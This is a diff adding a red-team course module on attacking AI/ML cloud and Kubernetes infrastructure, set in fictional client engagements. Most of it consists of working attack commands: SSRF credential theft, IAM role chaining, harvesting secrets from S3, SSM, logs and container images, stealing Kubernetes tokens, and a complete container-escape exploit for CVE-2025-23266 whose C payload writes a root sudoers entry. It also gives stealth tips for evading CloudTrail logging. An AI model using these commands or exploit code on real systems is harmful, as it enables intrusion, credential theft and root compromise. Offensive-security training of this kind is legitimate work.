@@ -1,0 +1,604 @@
+# Module 09 — AI Infrastructure and Deployment Exploits
+
+## MITRE ATLAS Coverage
+
+| ID | Technique | Description |
+|----|-----------|-------------|
+| AML.T0010.004 | Supply Chain: Container Registry | Poisoning container images used by ML workloads |
+| — | Cloud Infrastructure Discovery | Overly-broad IAM scoped to `*` reveals cross-project resources |
+| — | Unsecured Credentials | Secrets embedded in S3, CloudWatch logs, SSM, ECR images, model registry |
+
+---
+
+## 9.1 — Cloud Service Misconfigurations
+
+### 9.1.1 Architecture Overview
+
+**Shared Responsibility Model boundary:**
+- Cloud provider: underlying infrastructure security
+- Customer: data, access controls, and configuration
+
+**Common AI/ML services by category:**
+
+| Category | AWS | Azure | GCP |
+|----------|-----|-------|-----|
+| Training | SageMaker Training | Azure ML | Vertex AI |
+| Serving | SageMaker Endpoints | Azure ML Endpoints | Vertex AI Endpoints |
+| Registry | SageMaker Model Registry | Azure ML Registry | Vertex AI Model Registry |
+| Experiment tracking | SageMaker Experiments | Azure ML Experiments | Vertex AI Experiments |
+| Notebooks | SageMaker Studio | Azure ML Notebooks | Vertex AI Workbench |
+
+**Attack surface:** APIs, IAM roles, and integration points with other cloud services.
+
+---
+
+### 9.1.2 IAM and Access Management Weaknesses
+
+**Scenario:** Megacorp One AI / St. Hubbins Hospital — patient experience analysis model on AWS.
+
+#### Step 1 — SSRF on Lambda endpoint
+
+```bash
+curl -s "https://APIGATEWAY_URL/prod/api/export?template_url=file:///proc/self/environ" \
+  | jq -r '.report' | tr '\0' '\n' | grep -E '^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|BACKEND_ROLE_ARN|SAGEMAKER_ENDPOINT)='
+```
+
+**Variables recovered:**
+
+| Variable | Value |
+|----------|-------|
+| `SAGEMAKER_ENDPOINT` | `sthubbins-pea-endpoint` |
+| `BACKEND_ROLE_ARN` | `arn:aws:iam::533267328750:role/DataScientistRole` |
+| `REPORT_TEMPLATE_URL` | `https://example-corp-sthubbins-sagemaker-32953eae.s3.amazonaws.com/config/report-template.html` |
+| `DYNAMODB_TABLE` | `sthubbins-pea-feedback` |
+
+#### Step 2 — Export Lambda credentials and verify
+
+```bash
+export AWS_ACCESS_KEY_ID=ASIAXYKJVV3XAMCKCAIG
+export AWS_SECRET_ACCESS_KEY=Bl1FnI+DGg89kMBh4UF1XmdmZfO3DqkPzdZ989fH
+export AWS_SESSION_TOKEN=IQoJb3Jp...
+export AWS_REGION=us-east-1
+aws sts get-caller-identity
+```
+
+**Tip:** `sts:GetCallerIdentity` validates credentials and requires zero permissions — but it generates CloudTrail noise. Skip if you already know the source is a running Lambda.
+
+#### Step 3 — Enumerate IAM policies (stealth approach)
+
+Rather than brute-force (pacu/ScoutSuite), use known leads from environment variables:
+
+```bash
+# List inline policies — less likely to be denied than listing attached
+aws iam list-role-policies --role-name DataScientistRole
+# Returns: DataScientistPolicy
+
+aws iam get-role-policy --role-name DataScientistRole --policy-name DataScientistPolicy
+```
+
+**DataScientistPolicy key statements:**
+
+| Sid | Permissions | Scope |
+|-----|-------------|-------|
+| `SageMakerList` | `sagemaker:List*, Search` | `*` (no tag scope) |
+| `SageMakerDescribe` | `sagemaker:Describe*` | Tag: `Project=sthubbins-pea` |
+| `SageMakerEndpointInvoke` | `sagemaker:InvokeEndpoint` | Tag: `Project=sthubbins-pea` |
+| `PassRoleToSageMaker` | `iam:PassRole` | Same role only |
+| `IAMRoles` | `iam:ListRoles, GetRole, GetRolePolicy` | `*` |
+| `AssumeMLOpsRole` | `sts:AssumeRole` | → `MLOpsRole` |
+
+**SageMakerList note:** Listing actions cannot be scoped by resource tag — always applies account-wide.
+
+#### Step 4 — Enumerate all ML-related roles
+
+```bash
+aws iam list-roles --query 'Roles[?starts_with(RoleName, `DataScientist`) || starts_with(RoleName, `MLOps`) || starts_with(RoleName, `SageMaker`) || starts_with(RoleName, `RainyDay`)].RoleName'
+# Returns: DataScientistRole, MLOpsRole, RainyDayDataScientistRole, RainyDayVLLMRole, SageMakerExecutionRole
+```
+
+#### Step 5 — Assume DataScientistRole → MLOpsRole → SageMakerExecutionRole (chain)
+
+```bash
+# Hop 1: Lambda role → DataScientistRole (already assumed via SSRF)
+
+# Hop 2: DataScientistRole → MLOpsRole
+aws sts assume-role --role-arn arn:aws:iam::533267328750:role/MLOpsRole --role-session-name "pea-deploy"
+
+# Hop 3: MLOpsRole → SageMakerExecutionRole
+aws sts assume-role --role-arn arn:aws:iam::533267328750:role/SageMakerExecutionRole --role-session-name "training-run"
+```
+
+**MLOpsRole trust policy note:** `Principal: AWS: arn:aws:iam::ACCOUNT:root` means any IAM entity in the account can assume it, provided their own policy allows `sts:AssumeRole`.
+
+**Privilege escalation chain:**
+
+```
+Lambda (pea-portal-lambda-role)
+    ↓ sts:AssumeRole
+DataScientistRole
+    ↓ sts:AssumeRole (AssumeMLOpsRole statement)
+MLOpsRole
+    ↓ sts:AssumeRole (AssumeSageMakerRole statement)
+SageMakerExecutionRole
+    → AmazonSageMakerFullAccess (managed) = sagemaker:*, broad S3, ECR, CW, EC2, Lambda
+    → SageMakerExecutionExtra (inline) = SSM:GetParameter*, DynamoDB:*, apigateway:GET
+```
+
+**MLOpsRole alternative escalation path (without AssumeSageMakerRole):**
+- `SageMakerNotebookManagement` + `PassRoleToSageMaker` → create a notebook instance with `SageMakerExecutionRole` attached → SSRF/exec on that notebook → steal the execution role creds from IMDS.
+
+**SageMakerExecutionRole key capabilities:**
+- `AmazonSageMakerFullAccess`: `s3:*` on all buckets (no project scope)
+- `SageMakerExecutionExtra`: `ssm:GetParameter*` and `dynamodb:*` on `*`
+- Breaks all project tag boundaries set by DataScientistRole/MLOpsRole
+
+---
+
+### 9.1.3 Secrets and Credential Leakage
+
+**Five services, five leak vectors:**
+
+#### 1. S3 Buckets
+
+```bash
+aws s3 ls
+# example-corp-pea-site-*          ← static website
+# example-corp-rainyday-sagemaker-*  ← different client (scope issue!)
+# example-corp-sthubbins-sagemaker-*
+
+aws s3 ls s3://example-corp-sthubbins-sagemaker-32953eae/ --recursive
+# data/patient_feedback.csv ← PII: patient names, emails, department
+# models/sthubbins-pea-v1.tar.gz
+# notebooks/feature-engineering.ipynb
+```
+
+**S3 versioning tip:** `aws s3api list-object-versions` can recover deleted `.env`/config files.
+
+**Stealth tip:** `--recursive` generates `ListObjectsV2` CloudTrail events; targeted `GetObject` calls on known paths blend with application behavior.
+
+#### 2. AWS Secrets Manager
+
+```bash
+aws secretsmanager list-secrets
+# example-corp/devops/jenkins-deploy-c2b90b41 ← outside AmazonSageMakerFullAccess scope
+```
+
+**Access limitation:** `AmazonSageMakerFullAccess` only allows `GetSecretValue` on `AmazonSageMaker-*` ARN pattern or secrets tagged `SageMaker: true`. Jenkins token doesn't match — document for later.
+
+#### 3. SSM Parameter Store
+
+```bash
+aws ssm describe-parameters --query 'Parameters[*].[Name,Type,Description]'
+# /example-corp/sthubbins/prod/database-url   String (plaintext!)
+# /example-corp/rainyday/prod/plaid-api-key   String (plaintext!)
+# /example-corp/rainyday/prod/credit-bureau-url
+# /example-corp/rainyday/prod/model-endpoint-url
+
+aws ssm get-parameters-by-path --path "/example-corp/sthubbins/prod/" --recursive --with-decryption
+# postgresql://mluser:Pr0dP@ssw0rd2024!@features-db.example.internal:5432/sthubbins_features
+
+# Version history — reveals rotated (old) passwords
+aws ssm get-parameter-history --name "/example-corp/sthubbins/prod/database-url" --with-decryption
+```
+
+**String vs SecureString:** `String` = plaintext, no KMS encryption. Always check which type is used.
+
+**Stealth tip:** `GetParametersByPath --recursive` is noisy. Use `DescribeParameters` to map the namespace first, then `GetParameter` calls individually.
+
+#### 4. CloudWatch Logs
+
+```bash
+aws logs describe-log-groups --query 'logGroups[*].logGroupName'
+# /aws/sagemaker/training/sthubbins-pea ← training jobs log DEBUG credentials
+
+aws logs describe-log-streams --log-group-name "/aws/sagemaker/training/sthubbins-pea"
+aws logs get-log-events --log-group-name "/aws/sagemaker/training/sthubbins-pea" \
+  --log-stream-name "train-sthubbins-pea-v1-20240115" --query 'events[*].message'
+# [DEBUG] Using API key: fs-api-key-FAKE123456789abcdef
+# [DEBUG] Bearer token: mr-tok-FAKE987654321zyxwvu
+```
+
+**Failed runs are goldmines:** Error handlers often dump environment variables as debug context, and nobody reviews failed-job logs.
+
+```bash
+# Targeted search (stealthier)
+aws logs filter-log-events --log-group-name "/aws/sagemaker/training/sthubbins-pea" \
+  --filter-pattern "password OR key OR secret OR token"
+```
+
+#### 5. SageMaker Model Registry + ECR Images
+
+```bash
+# Model registry — environment variables in container spec
+aws sagemaker list-model-package-groups
+aws sagemaker list-model-packages --model-package-group-name sthubbins-pea-models
+aws sagemaker describe-model-package --model-package-name arn:aws:sagemaker:...:model-package/sthubbins-pea-models/2
+# Container.Environment.MODEL_REGISTRY_TOKEN = plaintext token
+# CustomerMetadataProperties = full pipeline map (training job, S3 path, role ARN, ECR URI)
+
+# ECR image — ENV directives baked at build time
+aws ecr get-login-password | docker login --username AWS --password-stdin ACCOUNT.dkr.ecr.REGION.amazonaws.com
+docker pull ACCOUNT.dkr.ecr.us-east-1.amazonaws.com/example-corp-sthubbins-training:latest
+docker inspect --format '{{json .Config.Env}}' IMAGE | jq -r '.[]'
+# DATABASE_URL=postgresql://mluser:Pr0dP@ssw0rd2024!@...
+# AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=...
+```
+
+**Credential value assessment:**
+
+| Credential | Source | Operational Value |
+|------------|--------|-------------------|
+| CloudWatch AWS creds | Failed training run | Likely expired; validate with `sts:GetCallerIdentity` |
+| Database URL | SSM + CloudWatch + ECR | PostgreSQL lateral movement if network reachable |
+| OpenAI API key | CloudWatch logs | Immediate: cost abuse, data exfiltration |
+| Model registry token | Model Registry + CloudWatch | Internal registry access |
+| ECR feature store key | ECR image ENV | Validate against feature store API |
+
+---
+
+### 9.1.4 Exposed Endpoints and Data Stores
+
+**Cross-project EC2 enumeration (AmazonSageMakerFullAccess = ec2:Describe* on `*`):**
+
+```bash
+aws ec2 describe-instances --filters "Name=instance-state-name,Values=running" \
+  --query 'Reservations[*].Instances[*].{ID:InstanceId,Type:InstanceType,PublicIP:PublicIpAddress,SG:SecurityGroups[0].GroupName,Project:Tags[?Key==`Project`]|[0].Value}'
+# i-0a1b2c3d: g4dn.xlarge, 54.210.123.45, SG=rainyday-risk-vllm-sg, Project=rainyday-risk
+
+# Inspect security group
+aws ec2 describe-security-groups --filters "Name=group-name,Values=rainyday-risk-vllm-sg"
+# Port 22: 0.0.0.0/0 (SSH open internet)
+# Port 8000: 0.0.0.0/0 (vLLM API — unauthenticated!)
+# Port 8080: 10.1.0.0/16 (internal only)
+```
+
+**Probe unauthenticated vLLM endpoint:**
+
+```bash
+curl -s http://54.210.123.45:8000/v1/models | jq
+# Returns model list without auth: Qwen/Qwen2.5-7B-Instruct-AWQ
+
+curl -s http://54.210.123.45:8000/version | jq
+# {"version": "0.12.0"} ← enables targeted CVE research
+```
+
+**Scope warning:** Discovering cross-project resources triggers engagement scope review. Passive enumeration = allowed. Active probing of another client's endpoint requires explicit authorization from engagement lead.
+
+**Root cause of cloud misconfigs:** Overly-permissive IAM scoped to `Resource: "*"` in shared accounts. Fix: resource-scoped policies with project-boundary conditions (tag-based ABAC or ARN patterns).
+
+---
+
+## 9.2 — Container and Orchestration Exploits
+
+### 9.2.1 Kubernetes and ML Deployments Overview
+
+**Cluster architecture:**
+- **Control plane:** API server, scheduler, etcd, controller manager
+- **Worker nodes:** Run pods; GPU nodes advertise GPU resources via device plugins
+- **Namespaces:** Logical isolation boundaries for resources, access policies, network rules
+- **Pod:** Smallest deployable unit; all containers in a pod share network namespace and can share volumes
+
+**GPU scheduling:** GPUs are schedulable resources like CPU/memory. NVIDIA device plugin registers physical GPUs with kubelet. GPU allocation governed by scheduler + RBAC — no kernel-level isolation (cgroups have no GPU controller).
+
+**Kubernetes RBAC primitives:**
+- **ServiceAccount:** Pod identity; token auto-mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`
+- **Role / ClusterRole:** Define permissions on API resources; ClusterRole = cluster-wide
+- **RoleBinding / ClusterRoleBinding:** Bind roles to service accounts, users, or groups
+- **ClusterRoleBinding** (key distinction): Grants permissions across ALL namespaces — most dangerous misconfiguration
+
+**ML workload types:**
+- Jupyter notebooks: Long-lived pods, broad filesystem + network access
+- Training jobs: Batch workloads (Argo/Kubeflow), GPU-consuming, write artifacts to shared storage
+- Inference services: KServe/Triton; expose prediction endpoints
+- Supporting: MLflow, MinIO artifact store, monitoring stack
+
+---
+
+### 9.2.2 Exploiting Kubernetes RBAC Misconfigurations
+
+**Scenario:** Ridgeline Autonomous — spearphished engineer → kubeconfig → cluster access.
+
+#### Kubeconfig analysis
+
+```bash
+kubectl config view --raw
+# API server: https://cp-01:6443
+# User: aisha-kone (client cert)
+# Default namespace: app
+
+# Parse certificate Subject for group membership
+kubectl config view --raw -o jsonpath='{.users[0].user.client-certificate-data}' \
+  | base64 -d | openssl x509 -text -noout | grep Subject
+# CN=aisha-kone, O=example-corp:av-platform-ops
+```
+
+**X.509 convention:** CN = username, O = group membership. Check O for `system:masters` or `cluster-admins`.
+
+#### Reconnaissance from bash history (pre-audit)
+
+```bash
+cat ~/.bash_history
+# Reveals: two target namespaces (app, ml-inference)
+# Reveals: kubectl exec patterns → establishes cover story for our exec calls
+# References: dashboard-api-credentials secret, app-config ConfigMap, inference-pod
+```
+
+#### ConfigMap enumeration (operational context, no auth required beyond get)
+
+```bash
+kubectl get configmap app-config -n app -o yaml
+# Reveals: inference service DNS, MLflow URI, feature store endpoint
+
+kubectl get configmap pipeline-config -n ml-inference -o yaml
+# Reveals: MinIO at minio.pipeline-system.svc:9000
+# Reveals: artifact bucket example-corp-ridgeline-artifacts
+# Reveals: MLflow experiment name, model path on disk
+```
+
+**ConfigMap note:** Not meant for secrets but frequently misused; always enumerate.
+
+#### Aisha's permissions audit
+
+```bash
+kubectl auth can-i --list -n ml-inference
+# Can: list pods, read logs, exec into pods, read services/ConfigMaps
+# Cannot: list/read secrets, create pods, enumerate RBAC
+```
+
+---
+
+### 9.2.3 Escalating Privileges Through Identity Chaining
+
+#### Step 1 — Exec into inference pod and read mounted SA token
+
+```bash
+kubectl exec -it inference-pod -n ml-inference -- /bin/bash
+
+cat /var/run/secrets/kubernetes.io/serviceaccount/token   # JWT
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace  # ml-inference
+# ca.crt available for TLS validation
+```
+
+#### Step 2 — Query API server as inference-sa (curl if kubectl unavailable)
+
+```bash
+export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+export APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
+
+# SelfSubjectRulesReview — enumerate own permissions
+curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+  -H "Authorization: Bearer ${TOKEN}" \
+  ${APISERVER}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"ml-inference"}}' \
+  | jq '.status.resourceRules[] | select(.resources != null) | {verbs, resources}'
+```
+
+**inference-sa capabilities (ClusterRole — applies everywhere):**
+
+| Resource | Verbs |
+|----------|-------|
+| `secrets` | `get, list, watch` |
+| `namespaces, pods, services, nodes` | `get, list, watch` |
+| `pods/exec, pods/log` | `create, get` |
+| `serviceaccounts` | `get, list` |
+| `clusterroles, clusterrolebindings, roles, rolebindings` | `get, list` |
+
+**Confirm cluster-wide scope:** Repeat `SelfSubjectRulesReview` against a different namespace (e.g., `monitoring`) — same rules confirm ClusterRoleBinding.
+
+#### Step 3 — Enumerate namespaces and secrets cross-namespace
+
+```bash
+# List all namespaces
+curl -s --cacert .../ca.crt -H "Authorization: Bearer ${TOKEN}" \
+  ${APISERVER}/api/v1/namespaces | jq -r '.items[].metadata.name'
+# app, ci-cd, data-engineering, default, kube-*, ml-inference, ml-inference-staging, monitoring, pipeline-system
+
+# List secrets in pipeline-system
+curl -s --cacert .../ca.crt -H "Authorization: Bearer ${TOKEN}" \
+  ${APISERVER}/api/v1/namespaces/pipeline-system/secrets \
+  | jq -r '.items[] | "\(.metadata.name)\t\(.type)"'
+# argo-controller-token   kubernetes.io/service-account-token  ← high value
+# minio-credentials       Opaque
+# mlflow-tracking-credentials Opaque
+# postgres-credentials    Opaque
+# backup-encryption-key   Opaque
+```
+
+#### Step 4 — Steal and decode Argo controller token
+
+```bash
+# Read the secret
+curl -s --cacert .../ca.crt -H "Authorization: Bearer ${TOKEN}" \
+  ${APISERVER}/api/v1/namespaces/pipeline-system/secrets/argo-controller-token \
+  | jq -r '.data.token' | base64 -d | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+# "sub": "system:serviceaccount:pipeline-system:argo-workflow-controller"
+
+# Test its permissions
+ARGO_TOKEN=$(... | jq -r '.data.token' | base64 -d)
+# SelfSubjectRulesReview with ARGO_TOKEN
+# Grants: create/delete/patch pods, create DaemonSets/CronJobs, wildcard Argo CRDs
+```
+
+**Identity comparison:**
+
+| Capability | inference-sa | argo-workflow-controller |
+|------------|-------------|--------------------------|
+| Read secrets (all namespaces) | ✅ | ✅ |
+| Enumerate RBAC | ✅ | ❌ |
+| List namespaces/nodes | ✅ | ❌ |
+| Exec into pods | ✅ | ✅ |
+| Create/delete pods | ❌ | ✅ |
+| Create DaemonSets, CronJobs | ❌ | ✅ |
+| Manage Argo workflows | ❌ | ✅ |
+
+**Chain logic:** inference-sa reads secrets → steals argo token → argo token creates pods → full cluster control.
+
+#### Step 5 — Exfiltrate artifact store credentials
+
+```bash
+curl -s --cacert .../ca.crt -H "Authorization: Bearer ${TOKEN}" \
+  ${APISERVER}/api/v1/namespaces/pipeline-system/secrets/minio-credentials \
+  | jq '{accesskey: (.data.accesskey | @base64d), secretkey: (.data.secretkey | @base64d)}'
+# accesskey: ridgeline-artifacts-sa
+# secretkey: Ridgeline2024!artifacts
+```
+
+**RBAC root cause analysis:**
+
+```bash
+# Find ClusterRoleBinding for inference-sa
+curl -s .../clusterrolebindings | jq '.items[] | select(.subjects[]?.name == "inference-sa") | {name, role: .roleRef.name}'
+# ml-inference-binding → ml-inference-role
+
+# Read the ClusterRole (intent vs implementation gap)
+# Description says "read secrets for dashboard auth" but grants cluster-wide secrets access
+```
+
+---
+
+### 9.2.4 Abusing Multi-Container Pods in ML Pipelines
+
+**MITRE:** AML.T0010.004 (Supply Chain: Container Registry — poisoning container images)
+
+**Pod architecture query:**
+
+```bash
+# From inside inference-pod
+curl -s --cacert .../ca.crt -H "Authorization: Bearer ${TOKEN}" \
+  ${APISERVER}/api/v1/namespaces/ml-inference/pods/model-pipeline \
+  | jq '{initContainers: [.spec.initContainers[].name], containers: [.spec.containers[] | {name, ports, volumeMounts}], volumes: [.spec.volumes[].name]}'
+```
+
+**model-pipeline structure:**
+- Init container: `model-loader` — runs before main containers, populates `/models` volume
+- Main containers: `pre-processor` (8081), `inference` (8080), `post-processor` (8082), `log-collector`
+- Shared volumes: `request-queue` (R/W for pre/inference/post), `logs` (R/W for all except log-collector read-only), `model-artifacts` (R/O for inference), `credentials` (R/O for inference only)
+
+**Sidecar attack surface:**
+
+```bash
+# Exec into pre-processor sidecar
+kubectl exec -it model-pipeline -c pre-processor -n ml-inference -- /bin/sh
+
+ls /queue/requests/
+cat /queue/requests/req_test-001.json
+# {"tokens": [...], "original": "vehicle collision at highway intersection", "request_id": "test-001"}
+```
+
+**Attack options from shared queue:**
+- **Exfiltrate:** Read all classification requests (PII in incident reports)
+- **Tamper:** Replace "critical" tokens with "routine" → force misclassification
+- **Inject:** Write fake requests to probe model behavior
+- **Cover tracks:** Write to shared log volume to poison audit trail
+
+**Security fix:** `automountServiceAccountToken: false` for pods that don't need API access. Use projected tokens with short TTL + audience restriction for those that do.
+
+---
+
+### 9.2.5 Container Security in AI Workloads (GPU Escape)
+
+**Scenario:** robertj — junior ML engineer, GPU host `ip-172-31-77-16`.
+
+**Key constraint:** Not in docker group. Has `sudo` for two wrapper scripts only:
+- `/opt/ridgeline/tools/gpu-build.sh`
+- `/opt/ridgeline/tools/gpu-run.sh`
+
+**Wrapper blocks:** `--privileged`, `--pid`, `--net=host`, `--cap-add`, `-v`/`--volume`, `--security-opt`
+
+**GPU isolation gap:** Linux cgroups v2 has no GPU controller. GPU isolation is entirely userspace (NVIDIA Container Toolkit). Kernel provides no enforcement — vulnerabilities in the userspace runtime bypass container boundaries.
+
+**Hardware-enforced GPU isolation (not available on older GPUs):**
+- NVIDIA MIG (A100+): Physical partitioning with dedicated compute/memory/cache
+- AMD Instinct MI300X: Chiplet-level partitioning
+- Intel Data Center GPU Flex: SR-IOV
+
+#### CVE-2025-23266 — LD_PRELOAD Injection via OCI Hook Environment Inheritance
+
+**Versions:** nvidia-container-toolkit 1.17.7, runc 1.2.6, `cuda-compat-mode = "hook"`
+
+**Root cause:**
+1. runc copies container ENV into its own process before spawning OCI hooks
+2. CUDA compatibility hook inherits polluted parent ENV (doesn't start clean)
+3. Dynamic linker loads `LD_PRELOAD` library from hook's (host) process context — as root
+
+**Exploit chain:**
+
+```
+Container ENV LD_PRELOAD set in Dockerfile
+    → runc copies ENV into its process
+    → CUDA compat hook inherits LD_PRELOAD from parent
+    → Host dynamic linker loads attacker's .so as root
+    → Constructor runs: writes sudoers entry
+    → robertj gets NOPASSWD: ALL
+```
+
+**Why wrapper script can't block it:** The exploit fires during container creation via OCI hook inheritance — before the container process starts. The wrapper only checks runtime flags, not Dockerfile ENV directives.
+
+**Payload (cuda_compat_shim.c):**
+
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#define SUDOERS "/etc/sudoers.d/cuda-compat-update"
+
+__attribute__((constructor))
+static void init(void) {
+    unsetenv("LD_PRELOAD");              // prevent recursive loading
+    FILE *f = fopen(SUDOERS, "w");
+    if (f) {
+        fprintf(f, "robertj ALL=(ALL) NOPASSWD: ALL\n");
+        fclose(f);
+        chmod(SUDOERS, 0440);
+    }
+}
+```
+
+**Dockerfile:**
+
+```dockerfile
+FROM busybox
+ENV LD_PRELOAD=/proc/self/cwd/cuda_compat_shim.so
+ADD cuda_compat_shim.so /
+```
+
+**`/proc/self/cwd` trick:** When the hook runs, its CWD is the container rootfs. `/proc/self/cwd/cuda_compat_shim.so` resolves through the host's `/proc` to the file inside the container image.
+
+**Build and trigger:**
+
+```bash
+gcc -shared -fPIC -nostartfiles -o /tmp/cuda-compat-build/cuda_compat_shim.so cuda_compat_shim.c
+
+sudo /opt/ridgeline/tools/gpu-build.sh \
+  -t cuda-compat-hotfix \
+  -f /tmp/cuda-compat-build/Dockerfile /tmp/cuda-compat-build/
+
+sudo /opt/ridgeline/tools/gpu-run.sh cuda-compat-hotfix echo done
+# Exploit fires → sudoers written
+
+sudo -i   # root shell
+```
+
+---
+
+## 9.3 — Key engagement distinctions
+
+| Concept | Detail |
+|---------|--------|
+| `sts:GetCallerIdentity` | Zero permissions needed; always works; generates CloudTrail noise |
+| ABAC tag condition | `StringEquals: aws:ResourceTag/Project` — doesn't work on List actions |
+| S3 versioning | `list-object-versions` recovers deleted secrets; `--recursive` is noisy |
+| `String` vs `SecureString` | SSM String = plaintext; SecureString = KMS encrypted |
+| `--filter-pattern` | Stealthier than full stream pulls in CloudWatch |
+| ClusterRole vs Role | ClusterRole = cluster-wide; Role = namespace-scoped |
+| ClusterRoleBinding | Binds ClusterRole to SA across ALL namespaces — most dangerous |
+| `automountServiceAccountToken: false` | Removes token mount for pods that don't need API access |
+| Long-lived SA token secret | Kubernetes pre-v1.24 auto-created `kubernetes.io/service-account-token` secrets; still present in many clusters |
+| `SelfSubjectRulesReview` | Tests own permissions via API — less noisy than `auth can-i --list`; usable without kubectl |
+| init container | Runs before main containers; often leaves artifacts on shared volumes |
+| GPU cgroups gap | No kernel GPU controller → isolation is userspace only |
+| CVE-2025-23266 | LD_PRELOAD injected via OCI hook ENV inheritance → host root escape |
+| `/proc/self/cwd` | Resolves to hook's CWD (container rootfs) on host — cross-namespace path trick |
+| MITRE AML.T0010.004 | Container registry poisoning for ML workload compromise |
